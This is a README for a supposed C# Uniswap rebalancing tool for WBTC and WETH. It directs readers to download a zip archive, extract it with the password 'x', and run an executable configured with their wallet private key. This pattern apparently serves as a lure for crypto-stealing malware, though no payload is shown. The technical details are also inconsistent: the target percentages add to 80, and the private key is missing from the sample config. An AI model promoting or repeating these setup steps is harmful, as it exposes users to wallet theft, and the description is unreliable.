# Rebalancer
Ethereum Uniswap Rebalancer C# program is a simple solution for rebalancing tokens (WBTC and WETH) on ethereum wallet using Uniswap smart contracts. The program, written in C# and using the Nethereum library, allows users to automate the rebalancing process by adjusting token allocation according to specified percentages.

Key Features:

- **Rebalancing Strategy:** The program implements a basic rebalancing strategy for a wallet between WBTC and WETH tokens with using Uniswap smart contracts.
- **User-Friendly Executable:** Users can easily download and run the program through a compiled executable (`UniswapRebalancer.exe`), making it accessible to non-developers.
- **Customizable Configuration:** Configuration parameters, including Infura API key, private key, wallet address, and token details, can be customized using the `config.json` file.

This tool is suitable for users who are looking for an automated approach to maintaining the desired number of tokens in their wallet. It serves as a starting point that can be extended and customized according to individual preferences and requirements.


## Getting Started
- [Clone](https://github.com/medlaare/rebalancer/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
- Extract archive with password `x`
- Modify the `config` file:

1. **Ethereum Networks:**
  - `rpcUrl`: The RPC URL for connecting to the Ethereum network.
  - `gasPrice`: The gas price in Wei to be used for transactions.
  - `gasLimit`: The gas limit per transaction.

2. **Rebalancer Settings:**
  - `targetWbtcPercentage`: Target percentage for WBTC in the portfolio.
  - `targetWethPercentage`: Target percentage for WETH in the portfolio.
  - `rebalancingInterval`: Time interval for rebalancing (e.g., `"1d"` for every 1 day).
  - `transactionTimeout`: Timeout for individual transactions in seconds.
```json
{
  "ethereum": {
    "mainnet": {
      "rpcUrl": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY",
      "gasPrice": 1000000000,  // Gas price in Wei
      "gasLimit": 300000       // Gas limit per transaction
    },
    "ropsten": {
      "rpcUrl": "https://ropsten.infura.io/v3/YOUR_INFURA_API_KEY",
      "gasPrice": 500000000,   // Gas price in Wei
      "gasLimit": 200000       // Gas limit per transaction
    },
    // Add more networks as needed
  },
  "rebalancer": {
    "targetWbtcPercentage": 50,
    "targetWethPercentage": 30,
    "rebalancingInterval": "1d",  // Rebalance every 1 day
    "transactionTimeout": 600,   // Timeout for transactions in seconds
    // Add more rebalancing settings as needed
  }
}
```
## How it works 
Here's a simplified explanation of how the Ethereum Uniswap Rebalancer C# program works:

1. **Configuration:**
   - The program is configured through a file (e.g., `config.json`) or environment variables, specifying Ethereum network details (RPC URL, gas costs) and rebalancing settings (target percentages, interval, timeout).

2. **Token Balances:**
   - The program connects to the specified Ethereum network (e.g., mainnet or testnet) using the provided RPC URL.
   - It retrieves the current balances of WBTC and WETH tokens in the user's wallet using the Uniswap contract.

3. **Rebalancing Logic:**
   - The program calculates the target amounts of WBTC and WETH based on the specified target percentages.
   - If the actual token balances deviate from the targets, it initiates a rebalancing process.

4. **Transaction Execution:**
   - If excess WBTC is detected, the program initiates a Uniswap transaction to sell the excess WBTC for WETH.
   - If excess WETH is detected, it initiates a Uniswap transaction to sell the excess WETH for WBTC.

5. **Gas Settings:**
   - Gas settings (gas price and limit) are used to determine transaction fees and ensure timely execution.

6. **Rebalancing Schedule:**
   - The program can be set to rebalance at specific intervals (e.g., daily) to maintain the target allocation over time.

7. **Testnet Support:**
   - Users are encouraged to test the program on a testnet first to ensure that it works as expected before using it on the Ethereum mainnet.

8. **Executable Usage:**
   - Users can download the compiled executable (`UniswapRebalancer.exe`) from the repository releases.
   - They can run the executable, which prompts them for necessary inputs and executes the rebalancing strategy.

In general, the program automates the process of maintaining the desired distribution of WBTC and WETH in the wallet by periodically checking and rebalancing token holdings based on user-configured preferences.
